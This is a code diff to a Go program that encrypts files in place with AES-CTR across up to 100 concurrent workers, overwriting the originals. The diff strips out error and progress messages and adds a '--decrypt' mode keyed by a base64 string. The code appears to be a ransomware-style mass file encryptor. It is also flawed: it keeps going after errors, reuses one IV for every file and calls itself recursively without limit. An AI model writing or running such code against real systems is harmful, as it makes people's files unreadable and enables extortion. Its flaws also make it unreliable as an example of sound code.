@@ -32,7 +32,6 @@ func createKey() []byte {
 
 func aesKey() []byte {
 	key := createKey()
-	fmt.Println(base64.StdEncoding.EncodeToString(key))
 	return key
 }
 
@@ -48,15 +47,12 @@ func Crypt(filename string, ch chan string) {
 	file, _ := os.Open(filename)
 	fileInfo, err := os.Stat(filename)
 	if err != nil {
-		fmt.Println(err)
 		wgc.Done()
-		fmt.Println("fail " + filename)
 		file.Close()
 		Crypt(<-ch, ch)
 	}
 	if fileInfo.Size() > 200000000 {
 		wgc.Done()
-		fmt.Println("too big " + filename)
 		file.Close()
 		Crypt(<-ch, ch)
 	}
@@ -66,12 +62,19 @@ func Crypt(filename string, ch chan string) {
 	blockCipher := createCipher()
 	stream := cipher.NewCTR(blockCipher, IV)
 	stream.XORKeyStream(arr, arr)
-	err = ioutil.WriteFile(filename, arr, 0644)
-	if err != nil {
-		fmt.Printf("Writing encryption file: %s\n", err)
-	}
+	_ = ioutil.WriteFile(filename, arr, 0644)
 	wgc.Done()
 	Crypt(<-ch, ch)
+}
+
+func DeCrypt(filename string, ch chan string) {
+	bytes, _ := ioutil.ReadFile(filename)
+	blockCipher, _ := aes.NewCipher(CryptKey)
+	stream := cipher.NewCTR(blockCipher, IV)
+	stream.XORKeyStream(bytes, bytes)
+	_ = ioutil.WriteFile(filename, bytes, 0644)
+	wgc.Done()
+	DeCrypt(<-ch, ch)
 }
 
 func main() {
@@ -88,13 +91,27 @@ func main() {
 		}(file)
 	}
 	wg.Wait()
-	<-ch
-	wgc.Done()
-	for i := 0; i < 100; i++ {
-		if len(ch) == 0 {
-			break
+	args := os.Args[1:]
+	if len(args) == 0 {
+		fmt.Print("Crypt With ")
+		fmt.Println(base64.StdEncoding.EncodeToString(CryptKey))
+		for i := 0; i < 100; i++ {
+			if len(ch) == 0 {
+				break
+			}
+			go Crypt(<-ch, ch)
 		}
-		go Crypt(<-ch, ch)
+		wgc.Wait()
+	} else if len(args) == 2 && args[0] == "--decrypt" {
+		CryptKey, _ = base64.StdEncoding.DecodeString(args[1])
+		fmt.Print("Decrypt With ")
+		fmt.Println(base64.StdEncoding.EncodeToString(CryptKey))
+		for i := 0; i < 100; i++ {
+			if len(ch) == 0 {
+				break
+			}
+			go DeCrypt(<-ch, ch)
+		}
+		wgc.Wait()
 	}
-	wgc.Wait()
 }
